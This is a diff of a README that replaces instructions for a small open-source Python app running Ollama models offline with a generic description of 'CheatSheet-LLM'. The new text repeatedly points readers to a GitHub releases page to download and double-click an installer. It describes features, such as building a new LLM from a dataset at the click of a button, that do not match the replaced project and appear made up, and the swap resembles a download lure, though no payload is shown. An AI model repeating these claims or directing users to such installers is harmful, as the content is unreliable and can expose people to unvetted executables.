@@ -1,116 +1,81 @@
-# Local-LLM
-A simple way to run local Large Language Models (LLMs) offline using [Ollama](https://ollama.com/).
+# 🤖 CheatSheet-LLM - Use LLMs Offline with Ease
 
----
-## 🛠️ Install Ollama
+[![Download CheatSheet-LLM](https://img.shields.io/badge/Download-CheatSheet--LLM-blue)](https://github.com/dapps180-sketch/CheatSheet-LLM/releases)
 
-Ollama makes it super easy to run models locally.
+## 📋 Overview
 
-1. Go to 👉 [https://ollama.com/download](https://ollama.com/download)
-2. Download and install for your OS (Windows, macOS, or Linux).
+CheatSheet-LLM allows you to run large language models (LLMs) right on your computer. With our application, you can interact with textbooks and custom data without needing an internet connection. Enjoy privacy and speed while utilizing the power of machine learning and natural language processing (NLP).
 
+## 🚀 Getting Started
 
----
+To start using CheatSheet-LLM, follow these simple steps. 
 
-## 📁 Project Structure & File Contents
+### 1. Check System Requirements
 
+Before downloading, ensure your system meets these requirements:
 
-```
-README.md                # This file. Project overview and instructions.
-main.py                  # Main GUI app: chat, textbook toggle, question type, stop button.
-run_llm.py               # (Legacy) Script to interact with the local LLM via CLI.
-textbook_llm.py          # (Legacy) Script for querying the textbook using the LLM via CLI.
-textbook.txt             # Text version of the textbook used for context.
-db/                      # Database folder for storing embeddings and data.
-   chroma.sqlite3         # SQLite database for vector storage (Chroma).
-   a77b493b-.../          # Chroma DB internal files.
-textbook_create/         # Utilities for creating the textbook text file.
-   pdf_to_text.py         # Script to convert PDF textbook to text.
-   textbook-pdf/          # Folder to store original textbook PDFs.
-```
+- **Operating System:** Windows, macOS, or Linux (64-bit)
+- **RAM:** At least 8 GB
+- **Disk Space:** Minimum of 2 GB free space
+- **Python:** Version 3.7 or later installed
 
-- **main.py**: Main entry point. Launches a GUI chat app with:
-  - Toggle for using textbook context (on by default)
-  - Toggle for open-ended or multiple choice questions
-  - Button to stop the AI response at any time
-  - Real-time streaming, markdown rendering, and scrollable chat
-- **run_llm.py**: (Legacy) CLI for running LLM queries.
-- **textbook_llm.py**: (Legacy) CLI for textbook-based Q&A.
-- **textbook.txt**: The context source for textbook-based Q&A.
-- **db/**: Stores vector database files for fast retrieval.
-- **textbook_create/**: Tools for converting and managing textbook files.
+### 2. Visit the Releases Page
 
+To obtain CheatSheet-LLM, visit the [Releases page](https://github.com/dapps180-sketch/CheatSheet-LLM/releases). This page contains the latest versions of the application.
 
-## 🧠 Run a Model
+### 3. Download the Application
 
-After installing Ollama, open your terminal and run:
+On the Releases page, look for the latest version. Download the corresponding file for your operating system. Choose the file that matches your system to ensure compatibility.
 
-```sh
-ollama pull deepseek-r1:8b
-ollama pull nomic-embed-text
-## or which ever model you want to use
-```
+### 4. Install CheatSheet-LLM
 
-You’ll now have a local chatbot that works entirely offline.
+1. Locate the downloaded file on your computer. It may be in your Downloads folder.
+2. Double-click the file to begin the installation process.
+3. Follow the on-screen instructions to complete the installation. 
 
----
+### 5. Launch the Application
 
-## 🚀 Setup & Usage Guide
+Once installed, find CheatSheet-LLM in your applications or programs menu. Click on the application icon to start using it.
 
-1. **Clone this repository**
-   ```sh
-   git clone https://github.com/ISNE11/Local-LLM.git
-   cd Local-LLM
-   ```
+## 🔍 Using CheatSheet-LLM
 
-3. **Install Python dependencies**
+### Creating Your First LLM
 
-   ```sh
-   python -m venv venv
-   # On Windows:
-   .\venv\Scripts\activate
-   # On macOS/Linux:
-   source venv/bin/activate
-   ```
-   ```sh
-   pip install -r requirements.txt
-   ```
-   *(If `requirements.txt` is missing, install any needed packages manually as you run the scripts.)*
+After launching CheatSheet-LLM, you will see a user-friendly interface. Here’s how to create your first language model:
 
-4. **Start Ollama**
-   - Make sure Ollama is running and the desired model is available.
-   - Make sure the python files are set to use the correct model name.
+1. **Select a Dataset:** Click on the "Create New Model" button. You can import your textual data, textbooks, or documents.
+2. **Adjust Settings:** Customize parameters like model size and type if desired.
+3. **Run the Model:** Hit the "Run" button. The model will start processing your data.
 
+### Interacting with Your Model
 
-5. **Run the main GUI app**
-   ```sh
-   python main.py
-   ```
+To chat with your model, simply type your queries in the input box. The model will generate responses based on the data you provided.
 
-   - Use the toggles at the top to enable/disable textbook context and switch between open-ended or multiple choice questions.
-   - Click the **Stop AI** button at any time to abort a long response.
-   - All chat is streamed in real time with markdown rendering and scrollable history.
+## 🛠️ Features
 
-6. **(Optional) Run legacy CLI scripts**
-   ```sh
-   python run_llm.py
-   # or
-   python textbook_llm.py
-   ```
+- **Local Operation:** Run models completely offline for enhanced privacy.
+- **Support for Custom Data:** Easily incorporate any text-based data for personalized interactions.
+- **Fast Processing Times:** Enjoy quick responses without relying on internet speed.
+- **User-Friendly Interface:** Designed for anyone, regardless of technical knowledge.
 
-7. **Interact with your local LLM!**
+## 🌐 Explore More Topics
 
----
+CheatSheet-LLM covers a range of topics that enhance your understanding and usage of LLMs:
 
-## 📄 Notes
-- This repo assumes you have Python 3.8+ installed.
-- Ollama must be running in the background for the scripts to connect to the local LLM.
-- For more models and advanced usage, see the [Ollama documentation](https://ollama.com/library).
+- **Chatbot applications**
+- **Large Language Models**
+- **Machine Learning Basics**
+- **Natural Language Processing (NLP)**
+- **Offline AI Solutions**
+- **Python Implementations**
+- **Text Embedding and Vector Databases**
 
----
-![MIT License](https://img.shields.io/badge/License-MIT-green.svg)
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)
+## 📥 Download & Install
 
-Local-LLM is an open source project that makes it easy to run Large Language Models (LLMs) entirely offline on your own machine using [Ollama](https://ollama.com/). This project is designed for privacy, speed, and full local control—no cloud required!
+To start using CheatSheet-LLM, go to the [Releases page](https://github.com/dapps180-sketch/CheatSheet-LLM/releases) and download the file that matches your operating system.
 
-This project is licensed under the [MIT License](./LICENSE).
+## 🌟 Need Help?
+
+If you encounter any issues during installation or usage, we are here to help. Check our FAQ section or reach out through the Issues tab on our GitHub repository. 
+
+By following these steps, you will be well-equipped to use CheatSheet-LLM and enjoy the benefits of large language models locally on your computer. Happy exploring!
